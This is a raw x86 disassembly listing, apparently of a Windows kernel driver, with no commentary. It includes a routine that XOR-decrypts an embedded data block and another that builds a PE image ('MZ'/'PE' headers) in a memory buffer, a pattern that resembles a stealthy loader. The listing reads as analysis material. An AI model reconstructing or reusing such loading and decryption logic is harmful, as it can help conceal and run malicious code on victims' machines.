   110ad:	8b 78 08             	mov    0x8(%eax),%edi
   110b0:	8b 10                	mov    (%eax),%edx
   110b2:	8b 14 3a             	mov    (%edx,%edi,1),%edx
   110b5:	8b 38                	mov    (%eax),%edi
   110b7:	03 f9                	add    %ecx,%edi
   110b9:	89 48 08             	mov    %ecx,0x8(%eax)
   110bc:	89 3e                	mov    %edi,(%esi)
   110be:	89 56 04             	mov    %edx,0x4(%esi)
   110c1:	01 50 08             	add    %edx,0x8(%eax)
   110c4:	5f                   	pop    %edi
   110c5:	59                   	pop    %ecx
   110c6:	c3                   	ret
   110c7:	8b 38                	mov    (%eax),%edi
   110c9:	8b 54 24 04          	mov    0x4(%esp),%edx
   110cd:	03 f9                	add    %ecx,%edi
   110cf:	89 48 08             	mov    %ecx,0x8(%eax)
   110d2:	89 3e                	mov    %edi,(%esi)
   110d4:	89 56 04             	mov    %edx,0x4(%esi)
   110d7:	01 50 08             	add    %edx,0x8(%eax)
   110da:	5f                   	pop    %edi
   110db:	59                   	pop    %ecx
   110dc:	c3                   	ret
   110dd:	cc                   	int3
   110de:	cc                   	int3
   110df:	cc                   	int3
   110e0:	55                   	push   %ebp
   110e1:	8b ec                	mov    %esp,%ebp
   110e3:	83 e4 f8             	and    $0xfffffff8,%esp
   110e6:	8b 55 08             	mov    0x8(%ebp),%edx
   110e9:	83 ec 44             	sub    $0x44,%esp
   110ec:	53                   	push   %ebx
   110ed:	56                   	push   %esi
   110ee:	57                   	push   %edi
   110ef:	b8 30 32 01 00       	mov    $0x13230,%eax
   110f4:	e8 e7 0c 00 00       	call   0x11de0
   110f9:	84 c0                	test   %al,%al
   110fb:	74 15                	je     0x11112
   110fd:	8b 45 10             	mov    0x10(%ebp),%eax
   11100:	8b 7d 0c             	mov    0xc(%ebp),%edi
   11103:	50                   	push   %eax
   11104:	e8 27 0c 00 00       	call   0x11d30
   11109:	5f                   	pop    %edi
   1110a:	5e                   	pop    %esi
   1110b:	5b                   	pop    %ebx
   1110c:	8b e5                	mov    %ebp,%esp
   1110e:	5d                   	pop    %ebp
   1110f:	c2 0c 00             	ret    $0xc
   11112:	8d 4c 24 0f          	lea    0xf(%esp),%ecx
   11116:	33 db                	xor    %ebx,%ebx
   11118:	51                   	push   %ecx
   11119:	88 5c 24 13          	mov    %bl,0x13(%esp)
   1111d:	e8 ee 18 00 00       	call   0x12a10
   11122:	3b c3                	cmp    %ebx,%eax
   11124:	0f 85 4c 01 00 00    	jne    0x11276
   1112a:	38 5c 24 0f          	cmp    %bl,0xf(%esp)
   1112e:	0f 84 42 01 00 00    	je     0x11276
   11134:	8b 7d 0c             	mov    0xc(%ebp),%edi
   11137:	8d 54 24 10          	lea    0x10(%esp),%edx
   1113b:	52                   	push   %edx
   1113c:	8d 44 24 38          	lea    0x38(%esp),%eax
   11140:	50                   	push   %eax
   11141:	8b cf                	mov    %edi,%ecx
   11143:	89 5c 24 18          	mov    %ebx,0x18(%esp)
   11147:	e8 04 18 00 00       	call   0x12950
   1114c:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
   11150:	0f 85 20 01 00 00    	jne    0x11276
   11156:	8b 4c 24 34          	mov    0x34(%esp),%ecx
   1115a:	8b 55 10             	mov    0x10(%ebp),%edx
   1115d:	3b 4a 04             	cmp    0x4(%edx),%ecx
   11160:	0f 85 10 01 00 00    	jne    0x11276
   11166:	a1 90 51 01 00       	mov    0x15190,%eax
   1116b:	a8 04                	test   $0x4,%al
   1116d:	74 0a                	je     0x11179
   1116f:	38 5c 24 38          	cmp    %bl,0x38(%esp)
   11173:	0f 85 fd 00 00 00    	jne    0x11276
   11179:	8d 74 24 18          	lea    0x18(%esp),%esi
   1117d:	e8 1e fa ff ff       	call   0x10ba0
   11182:	8b 5c 24 18          	mov    0x18(%esp),%ebx
   11186:	8b c7                	mov    %edi,%eax
   11188:	e8 d3 02 00 00       	call   0x11460
   1118d:	33 db                	xor    %ebx,%ebx
   1118f:	8d 74 24 1c          	lea    0x1c(%esp),%esi
   11193:	c6 44 24 24 01       	movb   $0x1,0x24(%esp)
   11198:	89 5c 24 28          	mov    %ebx,0x28(%esp)
   1119c:	e8 3f f9 ff ff       	call   0x10ae0
   111a1:	8b 54 24 1c          	mov    0x1c(%esp),%edx
   111a5:	8d 4c 24 24          	lea    0x24(%esp),%ecx
   111a9:	51                   	push   %ecx
   111aa:	52                   	push   %edx
   111ab:	e8 c0 fd ff ff       	call   0x10f70
   111b0:	3b c3                	cmp    %ebx,%eax
   111b2:	0f 85 b5 00 00 00    	jne    0x1126d
   111b8:	8b 44 24 28          	mov    0x28(%esp),%eax
   111bc:	8b 08                	mov    (%eax),%ecx
   111be:	8b 50 04             	mov    0x4(%eax),%edx
   111c1:	8d 44 24 20          	lea    0x20(%esp),%eax
   111c5:	50                   	push   %eax
   111c6:	8d 44 24 48          	lea    0x48(%esp),%eax
   111ca:	89 4c 24 48          	mov    %ecx,0x48(%esp)
   111ce:	89 54 24 4c          	mov    %edx,0x4c(%esp)
   111d2:	89 5c 24 50          	mov    %ebx,0x50(%esp)
   111d6:	e8 25 01 00 00       	call   0x11300
   111db:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   111df:	51                   	push   %ecx
   111e0:	8d 44 24 48          	lea    0x48(%esp),%eax
   111e4:	e8 17 01 00 00       	call   0x11300
   111e9:	8b 74 24 4c          	mov    0x4c(%esp),%esi
   111ed:	3b 74 24 48          	cmp    0x48(%esp),%esi
   111f1:	77 7a                	ja     0x1126d
   111f3:	39 5c 24 20          	cmp    %ebx,0x20(%esp)
   111f7:	75 74                	jne    0x1126d
   111f9:	33 ff                	xor    %edi,%edi
   111fb:	39 5c 24 14          	cmp    %ebx,0x14(%esp)
   111ff:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
   11203:	89 5c 24 2c          	mov    %ebx,0x2c(%esp)
   11207:	89 5c 24 30          	mov    %ebx,0x30(%esp)
   1120b:	76 60                	jbe    0x1126d
   1120d:	8d 49 00             	lea    0x0(%ecx),%ecx
   11210:	8b 54 24 44          	mov    0x44(%esp),%edx
   11214:	8d 1c 16             	lea    (%esi,%edx,1),%ebx
   11217:	83 c6 0c             	add    $0xc,%esi
   1121a:	89 74 24 4c          	mov    %esi,0x4c(%esp)
   1121e:	8d 74 24 3c          	lea    0x3c(%esp),%esi
   11222:	8d 44 24 44          	lea    0x44(%esp),%eax
   11226:	e8 75 fe ff ff       	call   0x110a0
   1122b:	8d 74 24 2c          	lea    0x2c(%esp),%esi
   1122f:	8d 44 24 44          	lea    0x44(%esp),%eax
   11233:	e8 68 fe ff ff       	call   0x110a0
   11238:	8b 74 24 4c          	mov    0x4c(%esp),%esi
   1123c:	3b 74 24 48          	cmp    0x48(%esp),%esi
   11240:	77 2b                	ja     0x1126d
   11242:	8b 44 24 3c          	mov    0x3c(%esp),%eax
   11246:	8b 55 08             	mov    0x8(%ebp),%edx
   11249:	e8 92 0b 00 00       	call   0x11de0
   1124e:	84 c0                	test   %al,%al
   11250:	74 12                	je     0x11264
   11252:	8b 4d 10             	mov    0x10(%ebp),%ecx
   11255:	8d 44 24 2c          	lea    0x2c(%esp),%eax
   11259:	50                   	push   %eax
   1125a:	8b 45 0c             	mov    0xc(%ebp),%eax
   1125d:	53                   	push   %ebx
   1125e:	51                   	push   %ecx
   1125f:	e8 8c 07 00 00       	call   0x119f0
   11264:	83 c7 01             	add    $0x1,%edi
   11267:	3b 7c 24 14          	cmp    0x14(%esp),%edi
   1126b:	72 a3                	jb     0x11210
   1126d:	8d 44 24 24          	lea    0x24(%esp),%eax
   11271:	e8 fa fd ff ff       	call   0x11070
   11276:	5f                   	pop    %edi
   11277:	5e                   	pop    %esi
   11278:	5b                   	pop    %ebx
   11279:	8b e5                	mov    %ebp,%esp
   1127b:	5d                   	pop    %ebp
   1127c:	c2 0c 00             	ret    $0xc
   1127f:	cc                   	int3
   11280:	55                   	push   %ebp
   11281:	8b ec                	mov    %esp,%ebp
   11283:	6a ff                	push   $0xffffffff
   11285:	68 e8 50 01 00       	push   $0x150e8
   1128a:	68 6a 31 01 00       	push   $0x1316a
   1128f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   11295:	50                   	push   %eax
   11296:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   1129d:	83 ec 08             	sub    $0x8,%esp
   112a0:	53                   	push   %ebx
   112a1:	56                   	push   %esi
   112a2:	57                   	push   %edi
   112a3:	89 65 e8             	mov    %esp,-0x18(%ebp)
   112a6:	ff 15 84 33 01 00    	call   *0x13384
   112ac:	3c 01                	cmp    $0x1,%al
   112ae:	77 2e                	ja     0x112de
   112b0:	8b 45 0c             	mov    0xc(%ebp),%eax
   112b3:	85 c0                	test   %eax,%eax
   112b5:	74 27                	je     0x112de
   112b7:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   112be:	8b 4d 10             	mov    0x10(%ebp),%ecx
   112c1:	51                   	push   %ecx
   112c2:	50                   	push   %eax
   112c3:	8b 55 08             	mov    0x8(%ebp),%edx
   112c6:	52                   	push   %edx
   112c7:	e8 14 fe ff ff       	call   0x110e0
   112cc:	eb 09                	jmp    0x112d7
   112ce:	b8 01 00 00 00       	mov    $0x1,%eax
   112d3:	c3                   	ret
   112d4:	8b 65 e8             	mov    -0x18(%ebp),%esp
   112d7:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   112de:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   112e1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   112e8:	5f                   	pop    %edi
   112e9:	5e                   	pop    %esi
   112ea:	5b                   	pop    %ebx
   112eb:	8b e5                	mov    %ebp,%esp
   112ed:	5d                   	pop    %ebp
   112ee:	c2 0c 00             	ret    $0xc
   112f1:	cc                   	int3
   112f2:	cc                   	int3
   112f3:	cc                   	int3
   112f4:	cc                   	int3
   112f5:	cc                   	int3
   112f6:	cc                   	int3
   112f7:	cc                   	int3
   112f8:	cc                   	int3
   112f9:	cc                   	int3
   112fa:	cc                   	int3
   112fb:	cc                   	int3
   112fc:	cc                   	int3
   112fd:	cc                   	int3
   112fe:	cc                   	int3
   112ff:	cc                   	int3
   11300:	8b 50 08             	mov    0x8(%eax),%edx
   11303:	8d 4a 04             	lea    0x4(%edx),%ecx
   11306:	3b 48 04             	cmp    0x4(%eax),%ecx
   11309:	77 0d                	ja     0x11318
   1130b:	56                   	push   %esi
   1130c:	8b 30                	mov    (%eax),%esi
   1130e:	8b 14 32             	mov    (%edx,%esi,1),%edx
   11311:	8b 74 24 08          	mov    0x8(%esp),%esi
   11315:	89 16                	mov    %edx,(%esi)
   11317:	5e                   	pop    %esi
   11318:	89 48 08             	mov    %ecx,0x8(%eax)
   1131b:	c2 04 00             	ret    $0x4
   1131e:	cc                   	int3
   1131f:	cc                   	int3
   11320:	56                   	push   %esi
   11321:	b9 f0 40 f6 7e       	mov    $0x7ef640f0,%ecx
   11326:	33 f6                	xor    %esi,%esi
   11328:	eb 06                	jmp    0x11330
   1132a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
   11330:	30 8e 90 51 01 00    	xor    %cl,0x15190(%esi)
   11336:	8b c1                	mov    %ecx,%eax
   11338:	83 e0 fb             	and    $0xfffffffb,%eax
   1133b:	c1 e0 1c             	shl    $0x1c,%eax
   1133e:	c1 e9 05             	shr    $0x5,%ecx
   11341:	0b c8                	or     %eax,%ecx
   11343:	8b d1                	mov    %ecx,%edx
   11345:	0f af d1             	imul   %ecx,%edx
   11348:	b8 d3 91 d8 79       	mov    $0x79d891d3,%eax
   1134d:	f7 e2                	mul    %edx
   1134f:	8b c1                	mov    %ecx,%eax
   11351:	69 c0 6a 95 7c 78    	imul   $0x787c956a,%eax,%eax
   11357:	c1 ea 0e             	shr    $0xe,%edx
   1135a:	8d 54 02 01          	lea    0x1(%edx,%eax,1),%edx
   1135e:	83 c6 01             	add    $0x1,%esi
   11361:	33 ca                	xor    %edx,%ecx
   11363:	81 fe ac 01 00 00    	cmp    $0x1ac,%esi
   11369:	72 c5                	jb     0x11330
   1136b:	66 a1 98 51 01 00    	mov    0x15198,%ax
   11371:	66 85 c0             	test   %ax,%ax
   11374:	5e                   	pop    %esi
   11375:	75 15                	jne    0x1138c
   11377:	0f b7 0f             	movzwl (%edi),%ecx
   1137a:	8b 57 04             	mov    0x4(%edi),%edx
   1137d:	51                   	push   %ecx
   1137e:	52                   	push   %edx
   1137f:	68 98 51 01 00       	push   $0x15198
   11384:	e8 db 1d 00 00       	call   0x13164
   11389:	83 c4 0c             	add    $0xc,%esp
   1138c:	c3                   	ret
   1138d:	cc                   	int3
   1138e:	cc                   	int3
   1138f:	cc                   	int3
   11390:	33 c0                	xor    %eax,%eax
   11392:	50                   	push   %eax
   11393:	68 c0 15 01 00       	push   $0x115c0
   11398:	68 b0 15 01 00       	push   $0x115b0
   1139d:	68 90 15 01 00       	push   $0x11590
   113a2:	68 7c 53 01 00       	push   $0x1537c
   113a7:	a3 7c 53 01 00       	mov    %eax,0x1537c
   113ac:	a3 80 53 01 00       	mov    %eax,0x15380
   113b1:	a3 84 53 01 00       	mov    %eax,0x15384
   113b6:	a3 88 53 01 00       	mov    %eax,0x15388
   113bb:	a3 8c 53 01 00       	mov    %eax,0x1538c
   113c0:	a3 90 53 01 00       	mov    %eax,0x15390
   113c5:	a3 94 53 01 00       	mov    %eax,0x15394
   113ca:	a3 98 53 01 00       	mov    %eax,0x15398
   113cf:	a3 9c 53 01 00       	mov    %eax,0x1539c
   113d4:	a3 a0 53 01 00       	mov    %eax,0x153a0
   113d9:	c6 05 a8 53 01 00 ff 	movb   $0xff,0x153a8
   113e0:	a3 a4 53 01 00       	mov    %eax,0x153a4
   113e5:	a3 ac 53 01 00       	mov    %eax,0x153ac
   113ea:	a3 b0 53 01 00       	mov    %eax,0x153b0
   113ef:	ff 15 e8 33 01 00    	call   *0x133e8
   113f5:	b8 7c 53 01 00       	mov    $0x1537c,%eax
   113fa:	c3                   	ret
   113fb:	cc                   	int3
   113fc:	cc                   	int3
   113fd:	cc                   	int3
   113fe:	cc                   	int3
   113ff:	cc                   	int3
   11400:	83 ec 14             	sub    $0x14,%esp
   11403:	56                   	push   %esi
   11404:	57                   	push   %edi
   11405:	89 44 24 08          	mov    %eax,0x8(%esp)
   11409:	8d 73 28             	lea    0x28(%ebx),%esi
   1140c:	ff 15 e0 33 01 00    	call   *0x133e0
   11412:	8b f8                	mov    %eax,%edi
   11414:	3b 7e 08             	cmp    0x8(%esi),%edi
   11417:	74 15                	je     0x1142e
   11419:	8b ce                	mov    %esi,%ecx
   1141b:	ff 15 80 33 01 00    	call   *0x13380
   11421:	88 46 04             	mov    %al,0x4(%esi)
   11424:	89 7e 08             	mov    %edi,0x8(%esi)
   11427:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
   1142e:	83 46 0c 01          	addl   $0x1,0xc(%esi)
   11432:	8d 4c 24 08          	lea    0x8(%esp),%ecx
   11436:	51                   	push   %ecx
   11437:	53                   	push   %ebx
   11438:	ff 15 e4 33 01 00    	call   *0x133e4
   1143e:	83 46 0c ff          	addl   $0xffffffff,0xc(%esi)
   11442:	8b f8                	mov    %eax,%edi
   11444:	75 12                	jne    0x11458
   11446:	8a 56 04             	mov    0x4(%esi),%dl
   11449:	8b ce                	mov    %esi,%ecx
   1144b:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
   11452:	ff 15 88 33 01 00    	call   *0x13388
   11458:	8b c7                	mov    %edi,%eax
   1145a:	5f                   	pop    %edi
   1145b:	5e                   	pop    %esi
   1145c:	83 c4 14             	add    $0x14,%esp
   1145f:	c3                   	ret
   11460:	83 ec 14             	sub    $0x14,%esp
   11463:	56                   	push   %esi
   11464:	57                   	push   %edi
   11465:	89 44 24 08          	mov    %eax,0x8(%esp)
   11469:	8d 73 28             	lea    0x28(%ebx),%esi
   1146c:	ff 15 e0 33 01 00    	call   *0x133e0
   11472:	8b f8                	mov    %eax,%edi
   11474:	3b 7e 08             	cmp    0x8(%esi),%edi
   11477:	74 15                	je     0x1148e
   11479:	8b ce                	mov    %esi,%ecx
   1147b:	ff 15 80 33 01 00    	call   *0x13380
   11481:	88 46 04             	mov    %al,0x4(%esi)
   11484:	89 7e 08             	mov    %edi,0x8(%esi)
   11487:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
   1148e:	83 46 0c 01          	addl   $0x1,0xc(%esi)
   11492:	8d 4c 24 08          	lea    0x8(%esp),%ecx
   11496:	51                   	push   %ecx
   11497:	53                   	push   %ebx
   11498:	ff 15 dc 33 01 00    	call   *0x133dc
   1149e:	84 c0                	test   %al,%al
   114a0:	75 23                	jne    0x114c5
   114a2:	83 46 0c ff          	addl   $0xffffffff,0xc(%esi)
   114a6:	75 12                	jne    0x114ba
   114a8:	8a 56 04             	mov    0x4(%esi),%dl
   114ab:	8b ce                	mov    %esi,%ecx
   114ad:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
   114b4:	ff 15 88 33 01 00    	call   *0x13388
   114ba:	5f                   	pop    %edi
   114bb:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   114c0:	5e                   	pop    %esi
   114c1:	83 c4 14             	add    $0x14,%esp
   114c4:	c3                   	ret
   114c5:	83 46 0c ff          	addl   $0xffffffff,0xc(%esi)
   114c9:	75 12                	jne    0x114dd
   114cb:	8a 56 04             	mov    0x4(%esi),%dl
   114ce:	8b ce                	mov    %esi,%ecx
   114d0:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
   114d7:	ff 15 88 33 01 00    	call   *0x13388
   114dd:	5f                   	pop    %edi
   114de:	33 c0                	xor    %eax,%eax
   114e0:	5e                   	pop    %esi
   114e1:	83 c4 14             	add    $0x14,%esp
   114e4:	c3                   	ret
   114e5:	cc                   	int3
   114e6:	cc                   	int3
   114e7:	cc                   	int3
   114e8:	cc                   	int3
   114e9:	cc                   	int3
   114ea:	cc                   	int3
   114eb:	cc                   	int3
   114ec:	cc                   	int3
   114ed:	cc                   	int3
   114ee:	cc                   	int3
   114ef:	cc                   	int3
   114f0:	53                   	push   %ebx
   114f1:	55                   	push   %ebp
   114f2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
   114f6:	56                   	push   %esi
   114f7:	8b d8                	mov    %eax,%ebx
   114f9:	57                   	push   %edi
   114fa:	8d 73 28             	lea    0x28(%ebx),%esi
   114fd:	ff 15 e0 33 01 00    	call   *0x133e0
   11503:	8b f8                	mov    %eax,%edi
   11505:	3b 7e 08             	cmp    0x8(%esi),%edi
   11508:	74 15                	je     0x1151f
   1150a:	8b ce                	mov    %esi,%ecx
   1150c:	ff 15 80 33 01 00    	call   *0x13380
   11512:	89 7e 08             	mov    %edi,0x8(%esi)
   11515:	33 ff                	xor    %edi,%edi
   11517:	88 46 04             	mov    %al,0x4(%esi)
   1151a:	89 7e 0c             	mov    %edi,0xc(%esi)
   1151d:	eb 02                	jmp    0x11521
   1151f:	33 ff                	xor    %edi,%edi
   11521:	83 46 0c 01          	addl   $0x1,0xc(%esi)
   11525:	8b 45 00             	mov    0x0(%ebp),%eax
   11528:	e8 d3 fe ff ff       	call   0x11400
   1152d:	85 c0                	test   %eax,%eax
   1152f:	74 2c                	je     0x1155d
   11531:	8b 45 00             	mov    0x0(%ebp),%eax
   11534:	e8 27 ff ff ff       	call   0x11460
   11539:	85 c0                	test   %eax,%eax
   1153b:	74 20                	je     0x1155d
   1153d:	83 46 0c ff          	addl   $0xffffffff,0xc(%esi)
   11541:	75 0e                	jne    0x11551
   11543:	8a 56 04             	mov    0x4(%esi),%dl
   11546:	8b ce                	mov    %esi,%ecx
   11548:	89 7e 08             	mov    %edi,0x8(%esi)
   1154b:	ff 15 88 33 01 00    	call   *0x13388
   11551:	5f                   	pop    %edi
   11552:	5e                   	pop    %esi
   11553:	5d                   	pop    %ebp
   11554:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   11559:	5b                   	pop    %ebx
   1155a:	c2 04 00             	ret    $0x4
   1155d:	57                   	push   %edi
   1155e:	6a 14                	push   $0x14
   11560:	55                   	push   %ebp
   11561:	53                   	push   %ebx
   11562:	ff 15 ec 33 01 00    	call   *0x133ec
   11568:	85 c0                	test   %eax,%eax
   1156a:	74 d1                	je     0x1153d
   1156c:	83 46 0c ff          	addl   $0xffffffff,0xc(%esi)
   11570:	75 0e                	jne    0x11580
   11572:	8a 56 04             	mov    0x4(%esi),%dl
   11575:	8b ce                	mov    %esi,%ecx
   11577:	89 7e 08             	mov    %edi,0x8(%esi)
   1157a:	ff 15 88 33 01 00    	call   *0x13388
   11580:	5f                   	pop    %edi
   11581:	5e                   	pop    %esi
   11582:	5d                   	pop    %ebp
   11583:	33 c0                	xor    %eax,%eax
   11585:	5b                   	pop    %ebx
   11586:	c2 04 00             	ret    $0x4
   11589:	cc                   	int3
   1158a:	cc                   	int3
   1158b:	cc                   	int3
   1158c:	cc                   	int3
   1158d:	cc                   	int3
   1158e:	cc                   	int3
   1158f:	cc                   	int3
   11590:	8b 44 24 08          	mov    0x8(%esp),%eax
   11594:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
   11598:	8b 00                	mov    (%eax),%eax
   1159a:	8b 09                	mov    (%ecx),%ecx
   1159c:	3b c1                	cmp    %ecx,%eax
   1159e:	75 08                	jne    0x115a8
   115a0:	b8 02 00 00 00       	mov    $0x2,%eax
   115a5:	c2 0c 00             	ret    $0xc
   115a8:	1b c0                	sbb    %eax,%eax
   115aa:	83 c0 01             	add    $0x1,%eax
   115ad:	c2 0c 00             	ret    $0xc
   115b0:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
   115b7:	00 
   115b8:	ff 25 a0 33 01 00    	jmp    *0x133a0
   115be:	cc                   	int3
   115bf:	cc                   	int3
   115c0:	8b 44 24 08          	mov    0x8(%esp),%eax
   115c4:	85 c0                	test   %eax,%eax
   115c6:	74 12                	je     0x115da
   115c8:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
   115cf:	00 
   115d0:	89 44 24 04          	mov    %eax,0x4(%esp)
   115d4:	ff 25 f8 33 01 00    	jmp    *0x133f8
   115da:	c2 08 00             	ret    $0x8
   115dd:	cc                   	int3
   115de:	cc                   	int3
   115df:	cc                   	int3
   115e0:	83 ec 0c             	sub    $0xc,%esp
   115e3:	53                   	push   %ebx
   115e4:	55                   	push   %ebp
   115e5:	8b 6c 24 18          	mov    0x18(%esp),%ebp
   115e9:	57                   	push   %edi
   115ea:	8b f9                	mov    %ecx,%edi
   115ec:	f6 47 06 02          	testb  $0x2,0x6(%edi)
   115f0:	75 15                	jne    0x11607
   115f2:	8b 08                	mov    (%eax),%ecx
   115f4:	8b 50 04             	mov    0x4(%eax),%edx
   115f7:	89 0e                	mov    %ecx,(%esi)
   115f9:	89 56 04             	mov    %edx,0x4(%esi)
   115fc:	8b c6                	mov    %esi,%eax
   115fe:	5f                   	pop    %edi
   115ff:	5d                   	pop    %ebp
   11600:	5b                   	pop    %ebx
   11601:	83 c4 0c             	add    $0xc,%esp
   11604:	c2 04 00             	ret    $0x4
   11607:	8b 00                	mov    (%eax),%eax
   11609:	50                   	push   %eax
   1160a:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   1160e:	51                   	push   %ecx
   1160f:	ff 15 c0 33 01 00    	call   *0x133c0
   11615:	55                   	push   %ebp
   11616:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   1161a:	e8 71 f1 ff ff       	call   0x10790
   1161f:	85 c0                	test   %eax,%eax
   11621:	75 2e                	jne    0x11651
   11623:	f6 47 06 01          	testb  $0x1,0x6(%edi)
   11627:	74 10                	je     0x11639
   11629:	8b 45 04             	mov    0x4(%ebp),%eax
   1162c:	8b 4f 08             	mov    0x8(%edi),%ecx
   1162f:	8b 58 04             	mov    0x4(%eax),%ebx
   11632:	8b 38                	mov    (%eax),%edi
   11634:	e8 c7 12 00 00       	call   0x12900
   11639:	8b 45 04             	mov    0x4(%ebp),%eax
   1163c:	8b 10                	mov    (%eax),%edx
   1163e:	8b 40 04             	mov    0x4(%eax),%eax
   11641:	89 46 04             	mov    %eax,0x4(%esi)
   11644:	89 16                	mov    %edx,(%esi)
   11646:	8b c6                	mov    %esi,%eax
   11648:	5f                   	pop    %edi
   11649:	5d                   	pop    %ebp
   1164a:	5b                   	pop    %ebx
   1164b:	83 c4 0c             	add    $0xc,%esp
   1164e:	c2 04 00             	ret    $0x4
   11651:	5f                   	pop    %edi
   11652:	5d                   	pop    %ebp
   11653:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
   11659:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
   11660:	8b c6                	mov    %esi,%eax
   11662:	5b                   	pop    %ebx
   11663:	83 c4 0c             	add    $0xc,%esp
   11666:	c2 04 00             	ret    $0x4
   11669:	cc                   	int3
   1166a:	cc                   	int3
   1166b:	cc                   	int3
   1166c:	cc                   	int3
   1166d:	cc                   	int3
   1166e:	cc                   	int3
   1166f:	cc                   	int3
   11670:	8b 48 04             	mov    0x4(%eax),%ecx
   11673:	83 ec 34             	sub    $0x34,%esp
   11676:	53                   	push   %ebx
   11677:	55                   	push   %ebp
   11678:	8b 6c 24 44          	mov    0x44(%esp),%ebp
   1167c:	56                   	push   %esi
   1167d:	57                   	push   %edi
   1167e:	6a 01                	push   $0x1
   11680:	51                   	push   %ecx
   11681:	8d 54 24 2c          	lea    0x2c(%esp),%edx
   11685:	52                   	push   %edx
   11686:	e8 ab 18 00 00       	call   0x12f36
   1168b:	83 c4 0c             	add    $0xc,%esp
   1168e:	85 c0                	test   %eax,%eax
   11690:	0f 85 6c 01 00 00    	jne    0x11802
   11696:	8b 3d 90 34 01 00    	mov    0x13490,%edi
   1169c:	81 c7 75 13 00 00    	add    $0x1375,%edi
   116a2:	e8 d9 07 00 00       	call   0x11e80
   116a7:	8b f0                	mov    %eax,%esi
   116a9:	85 f6                	test   %esi,%esi
   116ab:	75 0f                	jne    0x116bc
   116ad:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   116b2:	5f                   	pop    %edi
   116b3:	5e                   	pop    %esi
   116b4:	5d                   	pop    %ebp
   116b5:	5b                   	pop    %ebx
   116b6:	83 c4 34             	add    $0x34,%esp
   116b9:	c2 08 00             	ret    $0x8
   116bc:	68 75 13 00 00       	push   $0x1375
   116c1:	68 c8 3c 01 00       	push   $0x13cc8
   116c6:	56                   	push   %esi
   116c7:	8d 9e 75 13 00 00    	lea    0x1375(%esi),%ebx
   116cd:	e8 92 1a 00 00       	call   0x13164
   116d2:	a1 90 34 01 00       	mov    0x13490,%eax
   116d7:	83 c4 0c             	add    $0xc,%esp
   116da:	50                   	push   %eax
   116db:	68 a4 34 01 00       	push   $0x134a4
   116e0:	53                   	push   %ebx
   116e1:	e8 7e 1a 00 00       	call   0x13164
   116e6:	66 c7 03 4d 5a       	movw   $0x5a4d,(%ebx)
   116eb:	8b 0d 9c 34 01 00    	mov    0x1349c,%ecx
   116f1:	c7 04 19 50 45 00 00 	movl   $0x4550,(%ecx,%ebx,1)
   116f8:	8b 15 a0 34 01 00    	mov    0x134a0,%edx
   116fe:	83 c4 0c             	add    $0xc,%esp
   11701:	66 c7 04 1a 0b 01    	movw   $0x10b,(%edx,%ebx,1)
   11707:	a1 98 34 01 00       	mov    0x13498,%eax
   1170c:	68 98 00 00 00       	push   $0x98
   11711:	03 c3                	add    %ebx,%eax
   11713:	6a 00                	push   $0x0
   11715:	50                   	push   %eax
   11716:	89 45 04             	mov    %eax,0x4(%ebp)
   11719:	e8 52 1a 00 00       	call   0x13170
   1171e:	8b 4d 04             	mov    0x4(%ebp),%ecx
   11721:	89 71 58             	mov    %esi,0x58(%ecx)
   11724:	8b 55 04             	mov    0x4(%ebp),%edx
   11727:	89 5a 60             	mov    %ebx,0x60(%edx)
   1172a:	8b 45 04             	mov    0x4(%ebp),%eax
   1172d:	8b 0d 90 34 01 00    	mov    0x13490,%ecx
   11733:	89 48 68             	mov    %ecx,0x68(%eax)
   11736:	8b 54 24 3c          	mov    0x3c(%esp),%edx
   1173a:	8b 72 28             	mov    0x28(%edx),%esi
   1173d:	03 74 24 38          	add    0x38(%esp),%esi
   11741:	83 c4 0c             	add    $0xc,%esp
   11744:	8d 44 24 24          	lea    0x24(%esp),%eax
   11748:	56                   	push   %esi
   11749:	50                   	push   %eax
   1174a:	89 74 24 18          	mov    %esi,0x18(%esp)
   1174e:	e8 11 17 00 00       	call   0x12e64
   11753:	83 c4 08             	add    $0x8,%esp
   11756:	85 c0                	test   %eax,%eax
   11758:	0f 84 4f ff ff ff    	je     0x116ad
   1175e:	8b 48 0c             	mov    0xc(%eax),%ecx
   11761:	03 48 08             	add    0x8(%eax),%ecx
   11764:	8d 56 0c             	lea    0xc(%esi),%edx
   11767:	03 4c 24 2c          	add    0x2c(%esp),%ecx
   1176b:	3b ca                	cmp    %edx,%ecx
   1176d:	0f 82 3a ff ff ff    	jb     0x116ad
   11773:	8d 44 24 24          	lea    0x24(%esp),%eax
   11777:	50                   	push   %eax
   11778:	56                   	push   %esi
   11779:	e8 02 08 00 00       	call   0x11f80
   1177e:	85 c0                	test   %eax,%eax
   11780:	89 44 24 4c          	mov    %eax,0x4c(%esp)
   11784:	75 7c                	jne    0x11802
   11786:	8d 7c 24 4c          	lea    0x4c(%esp),%edi
   1178a:	8d 74 24 1c          	lea    0x1c(%esp),%esi
   1178e:	e8 ad f2 ff ff       	call   0x10a40
   11793:	8b 44 24 4c          	mov    0x4c(%esp),%eax
   11797:	85 c0                	test   %eax,%eax
   11799:	75 67                	jne    0x11802
